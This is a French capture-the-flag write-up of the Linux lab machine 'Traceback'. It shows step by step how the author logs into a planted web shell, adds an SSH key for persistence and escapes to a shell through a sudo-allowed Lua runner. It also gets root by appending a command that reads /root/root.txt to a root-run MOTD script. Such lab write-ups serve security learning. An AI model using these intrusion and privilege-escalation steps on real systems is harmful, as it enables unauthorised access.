Traceback

2020-07-30 — Ecrit par Eidorian

Hello aujourd’hui je vais vous présenter un writeup sur la machine traceback.
C’est une machine sous linux en difficulté EASY.

Je ne suis pas un expert, je fais ça avant tout pour gagner en comptétence et pour m’amuser.

Il est vivement conseiller d’avoir fait cette machine avant de lire ce Write-Up.

#Tools

  • Kali linux 2020 + Tous les tools
  • zsh pour le shell
  • VirtualBox pour ma VM kali linux

OSINT

Après beaucoup de temps perdu en utilisant divers outils sans rien en retour, j’ai commencé à me pencher sur le commentaire présent dans la page index.

Some of the best web shell that you might need

Mhm .. très bien j’ai fait ue recherche Google avec cette phrase et là miracle, je suis tombé sur un github avec pleins de webshell.

TheBinitGhimire/Web-Shells

J’ai commencé à entrer chaque nom de webshell sur le site jusquèà tomber sur le bon http://10.10.10.181/smevk.php.

C'était donc ça !

Webshell

smevk.php

Ce webshell est très complet, pour se connecter, il suffit de regarder le code source sur github, il y a le login et le mot de passe.

On regarde le compte utilisé si ca peut nous faire gagner une flag.

$ id
uid=1000(webadmin) gid=1000(webadmin) groups=1000(webadmin),24(cdrom),30(dip),46(plugdev),111(lpadmin),112(sambashare)

Il y a deux dossier dans /home, un dossier webadmin et un dossier sysadmin. Malheureusement l’utilisateur webadmin n’est pas le vrai compte user avec le flag. IL nous faut donc trouver un moyen de devenir sysadmin.

Pour me facilité la tâche, je vais enter ma clé publique SSH dans le dossier .ssh/autorized_keys de webadmin et ainsi avoir un accès SSH sans mot de passe.

$ echo "ssh-rsa <blablabla> eidorian@yamato" >> authorized_keys

webadmin

Après avoir eu un accès SSH sur le compte webadmin, il nous faut regarder ses droits.

webadmin@traceback:~$ sudo -l
Matching Defaults entries for webadmin on traceback:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User webadmin may run the following commands on traceback:
    (sysadmin) NOPASSWD: /home/sysadmin/luvit

Très très intéressant, notre ami a les droits root sans mot de passe sur un binaire qui se trouve dans /home/sysadmin/luvit qu’il ne peut executer que avec le compte sysadmin !

De plus on peut fouiller un peu les différents fichier dans le /home de notre webadmin il y a des choses intéressantes également.

notes.txt

webadmin@traceback:~$cat notes.txt

D’accord, il n’aime pas trop ça, allons nous documenter sur lua.

lua est un language de programmation/script, voici notre deuxième test.

webadmin@traceback:~$ cat privesc.lua 
function hello_world()
print("Hello word!")
end

webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua

Très très bien, nous pouvons donc faire notre test final près une petite recherche sur gtfobins.

On va ouvrir /bin/sh avec lua.

os.execute("/bin/sh")

webadmin@traceback:~$ sudo -u sysadmin /home/sysadmin/luvit privesc.lua
$ id
uid=1001(sysadmin) gid=1001(sysadmin) groups=1001(sysadmin)
$

WIN nous voila donc sysadmin, on peut maintenant afficher notre flag user dans /home/sysdadmin/user.txt.

A la recherche du compte root

Pour avoir un meilleur shell, j’ai modifié /bin/sh en /bin/bash.

Je commence mon enquête avec la commande ps -aux.

Les seules lignes intéressantes sont les suivantes :

root      11701  0.0  0.0   4628   808 ?        Ss   01:45   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.upd
root      11733  0.0  0.0   4628   776 ?        Ss   01:48   0:00 /bin/sh -c sleep 30 ; /bin/cp /var/backups/.update-motd.d/* /etc/update-motd.d/

On peut y voir une backup des fichiers motd, donc les fichiers qui servent à la bannière de connexion SSH.

Il y a pas mal de fichier mais le seul dossier accessible semble être .update-motd.d/

Tous les fichiers bannière sont présent ici. Accessible en lecture mais pas en ecriture donc aucuns moyen de les modifier pour le moment.

Enumération avec enum.sh

Après avoir essayé de mofifier les fichiers motd dans le répertoire backup je me retrouve désespéré, j’utilise donc un script d'énumération pour trouver d’autres indices.

Je vais récupérer mon scripts en utilise SimpleHttp en python

#Depuis mon host
python -m SimpleHTTPServer 8000

#Depuis traceback
wget http://10.10.14.34:8000/enum.sh

Malheureusement, je ne trouve rien d’autre qui peut m’aider.

Panique 2

Après je ne sais combien de temps, je décide de faire une pause pour aujourd’hui je reprends donc mon enquête demain.

Frais et motivé

Okok je suis de retour après une bonne nuit de sommeil.

Après quelques test, j’ai remarqué que j’avais les droit de modifier les bannières dans /etc/update-motd.d/ .

Si près du but depuis le début, c’est la vie !

Je vais donc modifier le fichier 00-HEADER pour y ajouter juste une petite ligne à la fin : cat /root/root.txt > /tmp/root.txt

Maintenant, je vais me connecter en SSH pour executer ce magnifique “exploit”.

sysadmin@traceback:/etc/update-motd.d$ cat /tmp/root.txt 
<flagflagflag>
